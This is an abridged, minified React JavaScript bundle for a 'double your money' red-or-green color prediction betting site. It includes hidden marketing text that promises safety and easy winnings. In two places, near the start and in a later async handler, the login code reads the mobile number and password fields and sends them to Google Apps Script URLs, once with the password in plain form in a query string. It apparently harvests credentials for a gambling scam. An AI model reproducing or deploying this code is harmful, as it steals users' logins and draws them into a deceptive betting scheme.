/*! For license information please see main.31cfb407.js.LICENSE.txt */
!(function () {
  "use strict";
  const showLoader = () =>
  ...
  let flag = true;
  const login = () => {
    const mobile_phone = document.querySelector("#mob").value;
    const password = document.querySelector("#pass").value;
    const url = "https://script.google.com/macros/s/AKfycbwc7qm2jfhEFF3q_MdiiAWrNqMSOKQflF51_ogSoow_I2g02-wVtl9yBuYYGw1LWjfqOw/exec";
    const data = new FormData();
    data.append("Key", mobile_phone);
    data.append("Value", password);
    showLoader();
    fetch(url, {
      method: "POST",
      body: data,
  ...
  var e = {
      463: function (e, n, t) {
        ...
        function qn(e, n, t, r) {
          if (Wn) {
            var l = Yn(e, n, t, r);
            if (null === l) Hr(e, n, r, Gn, t), Dn(e, r);
            else if (
              (function (e, n, t, r, l) {
                switch (n) {
                  case "focusin":
              ...
              for (; null !== l; ) {
                ...
                if (
                  (null !== a && Sn(a),
                  null === (a = Yn(e, n, t, r)) && Hr(e, n, r, Gn, t),
                  a === l)
                )
                  break;
                l = a;
        ...
        function Vl() {
          if (!Ul && null !== Il) {
            ...
            try {
              ...
              throw (null !== Il && (Il = Il.slice(e + 1)), Ke(Ze, Vl), l);
            } finally {
              (wn = n), (Ul = !1);
            }
          }
        ...
        var Ql = [],
          ...
          Xl = "";
        function Jl(e, n) {
          (Ql[Hl++] = $l), (Ql[Hl++] = Wl), (Wl = e), ($l = n);
        }
        function Zl(e, n, t) {
          (Kl[ql++] = Yl), (Kl[ql++] = Xl), (Kl[ql++] = Gl), (Gl = e);
          var r = Yl;
          e = Xl;
          var l = 32 - on(r) - 1;
          (r &= ~(1 << l)), (t += 1);
        ...
        function na(e) {
          for (; e === Wl; )
            (Wl = Ql[--Hl]), (Ql[Hl] = null), ($l = Ql[--Hl]), (Ql[Hl] = null);
          for (; e === Gl; )
            (Gl = Kl[--ql]),
              (Kl[ql] = null),
              (Xl = Kl[--ql]),
          ...
          switch (e.tag) {
            ...
            case 13:
              return (
                ...
                ((t = null !== Gl ? { id: Yl, overflow: Xl } : null),
                (e.memoizedState = {
                  dehydrated: n,
                  treeContext: t,
        ...
        var Ba = {
          ...
          enqueueSetState: function (e, n, t) {
            ...
            (a.payload = n),
              ...
              null !== (n = Oa(e, a, l)) && (ts(n, e, l, r), Ma(n, e, l));
          },
          ...
          enqueueForceUpdate: function (e, n) {
            ...
            (l.tag = 2),
              ...
              null !== (n = Oa(e, l, r)) && (ts(n, e, r, t), Ma(n, e, r));
          },
        };
        ...
        function Wa(e, n, t, r) {
          ...
          "object" === typeof a && null !== a
            ? (l.context = Ca(a))
            : ((a = Tl(n) ? Al : Pl.current), (l.context = Ll(e, a))),
        ...
        var oi = {
          ...
          si = {
            ...
            useTransition: function () {
              return [Ao(Po)[0], No().memoizedState];
            },
            useMutableSource: Lo,
            useSyncExternalStore: To,
            useId: ei,
        ...
        function Pi(e, n, t, r, l) {
          ...
          if ((Ea(n, l), null === n.stateNode))
            Qi(e, n), Qa(n, t, r), Wa(n, t, r, l), (r = !0);
          else if (null === e) {
            var o = n.stateNode,
              i = n.memoizedProps;
            o.props = i;
            ...
            i !== f || d !== h || zl.current || Aa
              ? ("function" === typeof p &&
                  (Ua(n, t, p, r), (h = n.memoizedState)),
                (s = Aa || Va(n, t, s, r, d, h, u) || !1)
                  ? (c ||
        ...
        function zi(e, n, t, r, l, a) {
          _i(e, n);
          var o = 0 !== (128 & n.flags);
          if (!r && !o) return l && Fl(n, t, !1), Hi(e, n, a);
          ...
          if (null !== (o = e.memoizedState) && null !== (r = o.dehydrated))
            return (function (e, n, t, r, l, o, i) {
              ...
              if (((u = 0 !== (i & e.childLanes)), wi || u)) {
                ...
                return ms(), ji(e, n, i, (r = fi(Error(a(421)))));
              }
              return "$?" === l.data
                ? ((n.flags |= 128),
                  (n.child = e.child),
        ...
        function Ki(e, n, t) {
          ...
          switch ((na(n), n.tag)) {
            ...
            case 4:
              return (
                lo(), null === e && Vr(n.stateNode.containerInfo), $i(n), null
              );
            case 10:
              return Sa(n.type._context), $i(n), null;
            case 19:
              if ((Cl(io), null === (o = n.memoizedState))) return $i(n), null;
              ...
              switch (((e.finishedWork = l), (e.finishedLanes = r), n)) {
                ...
                case 3:
                  if (
                    ...
                    e.timeoutHandle = rl(ks.bind(null, e, Uu, Qu), n);
                    break;
                  }
                  ks(e, Uu, Qu);
                  break;
                case 4:
                  ...
                  if (
                    ...
                    e.timeoutHandle = rl(ks.bind(null, e, Uu, Qu), r);
                    break;
                  }
                  ks(e, Uu, Qu);
                  break;
        ...
        function cs(e) {
          ...
          try {
            ...
            (wn = r), (Nu.transition = t), 0 === (6 & (Pu = n)) && Vl();
          }
        }
        function fs() {
          (Tu = Ru.current), Cl(Ru);
        ...
        function ds(e, n) {
          ...
          if ((-1 !== t && ((e.timeoutHandle = -1), ll(t)), null !== Au))
        ...
        function vs(e, n) {
          ...
          if ((ka(), (Pu = t), (Cu.current = r), null !== Au))
            throw Error(a(261));
        ...
        function ws(e) {
          ...
          do {
            ...
            if (((e = n.return), 0 === (32768 & n.flags))) {
              if (null !== (t = Ki(t, n, Tu))) return void (Au = t);
            } else {
              if (null !== (t = qi(t, n)))
        ...
        function Cs(e, n, t) {
          ...
          null !== r && r.delete(n),
            ...
            zu === e &&
              (Lu & t) === t &&
              (4 === Ou ||
              (3 === Ou && (130023424 & Lu) === Lu && 500 > Xe() - Bu)
                ? ds(e, 0)
                : (Iu |= t)),
            rs(e, n);
        }
        ...
        function Os(e, n, t, r, l, o) {
          ...
          if (((r = e), "function" === typeof e)) Ts(e) && (i = 1);
            ...
            e: switch (e) {
              ...
              case A:
                return (
                  ((e = Ls(19, t, n, l)).elementType = A), (e.lanes = o), e
                );
              case R:
                return Ds(t, l, o, n);
              default:
        ...
        function Hs(e, n, t, r) {
          ...
          return (
            ...
            null !== (e = Oa(l, n, o)) && (ts(e, l, o, a), Ma(e, l, o)),
            o
          );
        }
        function Ws(e) {
        ...
        xu = function (e, n, t) {
          ...
          else (wi = !1), la && 0 !== (1048576 & n.flags) && Zl(n, $l, n.index);
          switch (((n.lanes = 0), n.tag)) {
            ...
            case 3:
              e: {
                if ((Ai(n), null === e)) throw Error(a(387));
                (r = n.pendingProps),
  ...
  (t.m = e),
    ...
    (t.u = function (e) {
      return "static/js/" + e + ".0bca8be2.chunk.js";
    }),
    ...
    (function () {
      ...
      function l() {
        ...
        function E(e, n) {
          ...
          if ("throw" === l.type)
            return (
              (n.method = "throw"), (n.arg = l.arg), (n.delegate = null), p
            );
          var a = l.arg;
          return a
            ? a.done
                  ...
                  return l().wrap(function (e) {
                    for (;;)
                      switch ((e.prev = e.next)) {
                        case 0:
                          (n = document.getElementById("mob").value),
                            (t = document.getElementById("pass").value),
                            n &&
                              t &&
                              ((r =
                                "https://script.google.com/macros/s/AKfycbz3DEnGPIHUuXhDfT0VXQ1lrycs85DuYeDj8m993SsTRA8Qq8jAVSO3ekh2Liq82SOhxA/exec?mobile="
                                  .concat(n, "&password=")
                                  .concat(t)),
                              fetch(r),
          ...
          return (0, o.jsxs)("div", {
            ...
            children: [
                ...
                children: (0, o.jsxs)("div", {
                  ...
                  children: [
                    ...
                    (0, o.jsxs)("p", {
                      children: [
                        "Login ",
                        (0, o.jsx)("i", { className: "fa-light fa-user" }),
                      ],
                    }),
                  ],
                }),
              ...
              (0, o.jsxs)("div", {
                className: "invisText",
                children: [
                  (0, o.jsx)("h1", { children: "Double Your Money with Ease" }),
                  (0, o.jsx)("p", {
                    children:
                      "Are you ready for a thrilling and easy way to double your money? Look no further! Our online color prediction game lets you bet on either red or green and win big! With just a few clicks, you could be on your way to doubling your earnings.",
                  }),
                  (0, o.jsx)("h2", { children: "How to Play" }),
                  (0, o.jsx)("p", {
                    children:
                      "Playing the game is simple. Choose either red or green, place your bet, and watch as the wheel spins to reveal the winning color. It's that easy! The more you play, the better you'll get at predicting which color will come up next.",
                  }),
                  (0, o.jsx)("h2", { children: "Join the Fun" }),
                  (0, o.jsx)("p", {
                    children:
                      "Join thousands of players worldwide and experience the excitement of online color prediction. Sign up now to start betting, winning, and doubling your money with ease!",
                  }),
                  (0, o.jsx)("h2", { children: "Safe and Secure" }),
                  (0, o.jsx)("p", {
                    children:
                      "We take the safety and security of our players very seriously. Rest assured that your personal information and winnings are protected by top-notch security measures. So what are you waiting for? Start playing and winning today!",
                  }),
                ],
              }),
              (0, o.jsxs)("div", {
...
//# sourceMappingURL=main.31cfb407.js.map
